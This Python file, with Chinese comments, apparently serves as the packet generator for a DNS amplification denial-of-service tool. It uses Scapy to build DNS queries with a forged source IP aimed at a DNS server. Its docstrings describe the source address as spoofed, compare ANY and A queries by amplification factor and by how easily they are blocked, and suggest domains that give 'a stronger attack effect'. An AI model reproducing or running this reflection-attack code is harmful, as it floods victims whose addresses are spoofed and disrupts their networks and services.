#!/usr/bin/python3
# -*- coding: utf-8 -*-

from scapy.all import *


def generate_pkts(src_ip, dst_ip, query_type, packet_number, DNS_RD, ttl_length, dns_port, domain):
    '''构造DNS请求包
    Args:
        src_ip: 伪造的源IP地址
        dst_ip: 目的IP地址（DNS服务器）
        query_type: DNS请求类型，支持A和ANY类型，A类型单个包的放大倍数小，但不容易被屏蔽；ANY类型单个包的放大倍数大，但容易被屏蔽
        packet_number: 发送请求数据包的数量
        DNS_RD: DNS请求递归标志，DNS_RD=1为递归请求，DNS_RD=0表示非递归请求
        ttl_length: DNS请求包使用的TTL值        
        dns_port: DNS服务器的端口，一般情况下使用53端口
        domain: DNS请求包中使用的域名，默认为test.com，可以使用其他放大倍数更大的域名，获得更为强烈的攻击效果
    Returns:
        pkts: 构造好的数据包List
    '''
    if query_type == 'ANY':
        pkts = generate_any_type_dns_packets(src_ip, dst_ip, ttl_length=ttl_length,
                                             DNS_RD=DNS_RD, packet_number=packet_number,  dns_port=dns_port, domain=domain)
    elif query_type == 'A':
        pkts = generate_a_type_dns_packets(src_ip, dst_ip, ttl_length=ttl_length,
                                           DNS_RD=DNS_RD, packet_number=packet_number,  dns_port=dns_port, domain=domain)
    return pkts


def generate_any_type_dns_packets(src_ip, dst_ip, DNS_RD=1, ttl_length=128, packet_number=30, dns_port=53, domain='test.com'):
    '''构造ANY类型的DNS请求包，源端口>30000，此函数在generate_pkts中调用
    '''
    pkt_list = []
    for il in range(packet_number):
        newp = Ether()/IP(src=src_ip, dst=dst_ip, ttl=ttl_length)/UDP(sport=30000+il, dport=dns_port) / \
            DNS(id=100+il*5, rd=DNS_RD, qd=DNSQR(qname=domain, qtype=255))
        print(src_ip)
        pkt_list.append(newp)
    return pkt_list


def generate_a_type_dns_packets(src_ip, dst_ip, DNS_RD=1, ttl_length=128, packet_number=30, dns_port=53, domain='test.com'):
    '''构造ANY类型的DNS请求包，源端口>30000，此函数在generate_pkts中调用
    '''
    pkt_list = []
    for il in range(packet_number):
        newp = Ether()/IP(src=src_ip, dst=dst_ip, ttl=ttl_length)/UDP(sport=30000+il,
                                                                      dport=dns_port)/DNS(id=100+il*5, rd=DNS_RD, qd=DNSQR(qname=domain))
        pkt_list.append(newp)
    return pkt_list
